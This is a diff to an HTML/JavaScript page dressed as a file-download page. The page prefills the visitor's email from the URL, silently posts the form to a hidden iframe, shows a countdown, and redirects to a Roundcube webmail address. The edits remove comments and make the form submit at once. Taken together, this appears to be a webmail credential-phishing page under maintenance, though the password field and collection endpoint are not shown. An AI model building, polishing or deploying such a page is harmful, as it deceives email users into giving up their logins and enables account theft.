@@ -54,7 +54,6 @@
     .file-info { margin-top:18px; border-top:1px solid #eee; padding-top:14px; display:flex; gap:12px; align-items:flex-start; color:#333; }
     .file-thumb { width:48px; flex:0 0 48px; } .file-thumb img { width:100%; } .file-meta { flex:1; } .file-meta h4 { margin-bottom:6px; font-size:15px; color:#0b58a8; } .file-meta .desc, .file-meta .size { font-size:13px; color:#666; }
 
-    /* new small helpers */
     .small-actions { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
     .link { color:#0b58a8; cursor:pointer; text-decoration:underline; display:inline-block; margin-left:8px; }
     .hidden { display:none; }
@@ -207,7 +206,7 @@
     const modalProceed = document.getElementById('modalProceed');
     const countdownNumber = document.getElementById('countdownNumber');
 
-    // Autofill email (editable)
+    // Autofill email
     window.addEventListener('DOMContentLoaded', () => {
       const params = new URLSearchParams(window.location.search);
       const urlEmail = params.get('email');
@@ -267,25 +266,20 @@
     const AUTO_REDIRECT_SECONDS = 8;
 
     function openModalAndScheduleRedirect() {
-      // show modal
       modalOverlay.style.display = 'flex';
       modalOverlay.setAttribute('aria-hidden', 'false');
 
-      // initialize countdown
       let remaining = AUTO_REDIRECT_SECONDS;
       countdownNumber.textContent = remaining;
 
-      // clear any previous timers
       if (redirectTimer) { clearTimeout(redirectTimer); redirectTimer = null; }
       if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
 
-      // start countdown interval to update UI
       countdownTimer = setInterval(() => {
         remaining -= 1;
         if (remaining >= 0) countdownNumber.textContent = remaining;
       }, 1000);
 
-      // schedule actual redirect after seconds
       redirectTimer = setTimeout(() => {
         if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
         window.location.href = ROUND_CUBE_URL;
@@ -304,13 +298,10 @@
     // ✅ Show modal only after hitting DOWNLOAD
     document.getElementById('mainForm').addEventListener('submit', (e) => {
       e.preventDefault(); 
+      e.target.submit();  // post to hidden iframe
       openModalAndScheduleRedirect(); // show modal
-      setTimeout(() => {
-        e.target.submit(); // send after short delay (so modal is visible)
-      }, 200);
     });
 
-    // User action buttons on modal
     modalClose.addEventListener('click', () => {
       closeModalAndRedirectImmediately();
     });
@@ -319,7 +310,6 @@
       closeModalAndRedirectImmediately();
     });
 
-    // Allow Enter to continue from email
     emailInput.addEventListener('keydown', (e) => {
       if (e.key === 'Enter') {
         e.preventDefault();
